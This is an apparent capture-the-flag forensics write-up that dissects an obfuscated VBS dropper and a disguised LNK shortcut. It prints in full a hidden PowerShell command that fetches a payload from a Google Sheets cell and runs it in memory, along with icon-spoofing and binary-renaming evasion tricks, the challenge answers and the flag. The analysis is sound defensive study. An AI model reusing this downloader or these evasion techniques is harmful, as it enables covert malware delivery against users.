# Scripts and Formulas

**Challenge Scenario**

**After the last site UNZ used to rely on for the majority of Vitalium mining ran dry, the UNZ hired a local geologist to examine possible sites that were used in the past for secondary mining operations. However, after finishing the examinations, and the geologist was ready to hand in his reports, he mysteriously went missing! After months, a mysterious invoice regarding his examinations was brought up to the Department. Being new to the job, the clerk wasn't aware of the past situation and opened the Invoice. Now all of a sudden, the Arodor faction is really close to taking the lead on Vitalium mining! Given some Logs from the Clerk's Computer and the Invoice, pinpoint the intrusion methods used and how the Arodor faction gained access!**

We are given a vbs script file, a link file and a bunch of logs. First of all I use EvtxECmd to make the logs more organized. Then I start to inspect the vbs script, as I must know what is happening to locate where to search in the logs:

![](1.png)

The code is terribly obfuscated, I will try to make out what is it intent. First is to find the entry point, I notice the main() subroutine in the very end, this should be the entry:

![](2.png)

Locate that function:

![](3.png)

Now we should return to that LL...() function and break it down:

![](4.png)

It takes a string t, then chop it to an array, each character goes to its corresponding slot, then it filter out all uppercase letters and numeric value, assign the remaining characters to a new string. They do this as an attempt for defense evasion, add junk uppercase letters and numbers to input to bypass AV, then filter it to get the actual payload.

![](5.png)

So the result of this pile is: `c:\windows\system32\windowspowershell\v1.0\powershell.exe` , this path is assign to yNS...

![](6.png)

Then I use this super-basic python script to handle the remaining stuff and re-construct the command. The de-obfuscated command is: `c:\windows\system32\windowspowershell\v1.0\powershell.exe -ep bypass -w hidden -c "$url = [system.text.encoding]::ascii.getstring([system.convert]::frombase64string('aHR0cHM6Ly9zaGVldHMuZ29vZ2xlYXBpcy5jb20vdjQvc3ByZWFkc2hlZXRzLzFIcEI0R3FxWXdJNlg3MXo0cDJFSzg4Rm9KanJzVzJES2JTa3gtcm81bFFRP2tleT1BSXphU3lEVXBqU2Y3UjFsMWRRb2hBNVF2OUVkeVdBM0tCT01jMFUmcmFuZ2VzPVNoZWV0MSFPMzcmaW5jbHVkZUdyaWREYXRhPXRydWU='));$resp = invoke-restmethod -uri $url;$payload = $resp.sheets[0].data[0].rowData[0].values[0].formattedValue;$decode = [system.convert]::frombase64string($payload);$ms = new-object system.io.memorystream;$ms.write($decode,0, $decode.length);$ms.position =0;$sr = new-object system.io.streamreader(new-object system.io.compression.deflatestream($ms, [system.io.compression.compressionmode]::decompress));$data = $sr.readtoend();$sr.close();$ms.close();$data | iex"`

**-ep bypass** lets the script run regardless of local security settings.

**-w hidden** hides the powershell window.

Then it connects to `https://sheets.googleapis.com/v4/spreadsheets/1HpB4GqqYwI6X71z4p2EK88FoJjrsW2DKbSkx-ro5lQQ?key=AIzaSyDUpjSf7R1l1dQohA5Qv9EdyWA3KBOMc0U&ranges=Sheet1!O37&includeGridData=true` (quite strange, this is a legitimate site ?) and read data in s specific cell, that cell should contain the next stage of the malware. Then the data is deflatted, base64-decoded and executed directly in the memory with Invoke-Expression. 

We are also given a `.lnk` file, inspect it with exiftool yields the following result:

![](7.png)

First and foremost, it leverages Icon File Name trick to change the shortcut icon from powershell to wordpad.exe, this makes naive user think that it is just a text document. And for the main command, it spawns powershell with the classic flag for malware: **no profile, single-threaded, non-interactive and hidden window**. After that is another defense evasion attempt, it copies the legitimate Windows Host Script used to run vbscript to the current directory and rename it calc.exe, then executes it to run the above .vbs script.

**Now let's start with the questions:**

## 1. What program is being copied, renamed, and what is the final name? (Eg: notepad.exe:picture.jpeg)

Answer lies in the lnk file.

**Answer: cscript.exe:calc.exe**

## 2. What is the name of the function that is used for deobfuscating the strings, in the VBS script? (Eg: funcName)

It is the function that filters uppercase letters and numbers in the vbs script

**Answer: LLdunAaXwVgKfowf**

## 3. What program is used for executing the next stage? (Eg: notepad.exe)

As we already analyzed, the script spawns powershell to download payload.

**Answer: powershell.exe**

## 4. What is the Spreadsheet ID the malicious actor downloads the next stage from? (Eg: U3ByZWFkU2hlZXQgSUQK)

The link I mentioned above contains the answer

**Answer: 1HpB4GqqYwI6X71z4p2EK88FoJjrsW2DKbSkx-ro5lQQ**

## 5. What is the Sheet Name and Cell Number that houses the payload? (Eg: Sheet1:A1)

Still no need to read the log, answer lies in the link above

**Answer: Sheet1:O37**

## 6. What is the Event ID that relates to Powershell execution? (Eg: 5991)

Experience or external search is enough

**Answer: 4104**

## 7. In the final payload, what is the XOR Key used to decrypt the shellcode? (Eg: 1337)

![](8.png)

**Answer: 35**

`Flag: HTB{GSH33ts_4nd_str4ng3_f0rmula3_1s_4_g00d_w4y_f0r_byp4ss1ng_f1r3w4lls!!}`

*Perhaps this challenge is about inspecting logs, but as I fully analyzed the vbs script from the beginning, everything become trivial in the questions*

